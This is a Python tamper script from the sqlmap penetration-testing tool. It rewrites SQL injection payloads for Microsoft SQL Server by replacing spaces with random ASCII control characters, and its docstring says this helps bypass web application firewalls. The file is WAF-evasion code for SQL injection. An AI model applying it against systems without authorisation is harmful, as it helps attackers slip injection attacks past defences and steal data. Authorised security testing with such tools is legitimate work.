#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import random

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL))

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with a random blank character from a
    valid set of alternate characters

    Requirement:
        * Microsoft SQL Server

    Tested against:
        * Microsoft SQL Server 2000
        * Microsoft SQL Server 2005

    Notes:
        * Useful to bypass several web application firewalls

    >>> random.seed(0)
    >>> tamper('SELECT id FROM users')
    'SELECT%0Eid%0DFROM%07users'
    """

    # ASCII table:
    #   SOH     01      start of heading
    #   STX     02      start of text
    #   ETX     03      end of text
    #   EOT     04      end of transmission
    #   ENQ     05      enquiry
    #   ACK     06      acknowledge
    #   BEL     07      bell
    #   BS      08      backspace
    #   TAB     09      horizontal tab
    #   LF      0A      new line
    #   VT      0B      vertical TAB
    #   FF      0C      new page
    #   CR      0D      carriage return
    #   SO      0E      shift out
    #   SI      0F      shift in
    blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace, end = False, False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                end = True

            elif payload[i] == " " and not doublequote and not quote:
                if end:
                    retVal += random.choice(blanks[:-1])
                else:
                    retVal += random.choice(blanks)

                continue

            retVal += payload[i]

    return retVal
